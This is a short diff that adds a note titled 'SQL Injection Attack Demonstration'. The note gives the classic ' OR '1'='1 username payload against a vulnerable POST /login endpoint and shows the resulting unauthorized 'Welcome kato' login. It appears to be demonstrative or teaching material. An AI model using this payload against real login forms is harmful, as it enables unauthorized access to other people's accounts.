@@ -1,0 +1,14 @@
+SQL Injection Attack Demonstration
+Old vulnerable endpoint:
+POST /login
+
+Payload:
+
+Username:
+' OR '1'='1
+
+Password:
+anything
+
+Unexpected result:
+Welcome kato
